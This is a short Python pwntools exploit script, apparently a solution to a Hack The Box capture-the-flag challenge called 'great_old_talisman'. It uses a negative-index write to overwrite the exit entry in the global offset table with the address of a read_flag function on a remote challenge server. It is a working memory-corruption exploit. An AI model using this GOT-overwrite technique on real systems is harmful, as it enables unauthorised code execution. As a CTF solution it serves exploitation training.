#!/usr/bin/python3.8
from pwn import *
import warnings
import os
warnings.filterwarnings('ignore')
context.arch = 'amd64'
context.log_level = 'critical'

fname = './great_old_talisman' 

LOCAL = False

os.system('clear')


r    = remote('94.237.59.206', 56087)

e = ELF(fname)

# Find addresses
exit  = e.got.exit
talis = e.sym.talis 
print(f'exit@GOT  : {exit:#04x}\nTalis addr: {talis:#04x}')

# Calculate offset and GOT overwrite exit
off = -(talis - exit) // 8
r.sendlineafter('>> ', str(off))
r.sendlineafter(': ', p64(e.sym.read_flag))

# Get flag
print(f'\nFlag --> {r.recvline_contains(b"HTB").strip().decode()}\n')